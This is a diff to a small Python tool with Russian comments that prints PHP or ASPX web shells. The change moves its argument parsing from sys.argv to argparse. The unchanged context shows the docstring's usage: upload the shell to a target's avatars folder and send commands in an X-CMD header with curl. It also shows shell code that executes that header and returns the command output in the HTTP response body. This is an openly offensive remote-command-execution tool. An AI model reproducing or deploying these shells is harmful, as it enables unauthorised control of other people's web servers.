@@ -3,7 +3,7 @@
 Кидаешь webshell.php на цель, дёргаешь так:
   curl -H "X-CMD: id" http://target/files/avatars/ws.php
 Фича: вывод возвращается телом ответа, работает через allow_url_include-off и без GET-параметров."""
-import sys
+import argparse
 
 PHP = r'''<?php
 $h = $_SERVER['HTTP_X_CMD'] ?? '';
@@ -20,8 +20,13 @@ if (!string.IsNullOrEmpty(c)) { Response.ContentType = "text/plain";
   p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); p.WaitForExit(); }
 %>'''
 
-if len(sys.argv) < 2 or sys.argv[1] not in ('php', 'aspx'):
-    print(__doc__)
-    sys.exit(1)
+def main():
+    p = argparse.ArgumentParser(
+        description=__doc__.strip(),
+        formatter_class=argparse.RawDescriptionHelpFormatter)
+    p.add_argument('type', choices=['php', 'aspx'], help='какой шелл отдать в stdout')
+    args = p.parse_args()
+    print(PHP if args.type == 'php' else PS)
 
-print(PHP if sys.argv[1] == 'php' else PS)
+if __name__ == '__main__':
+    main()
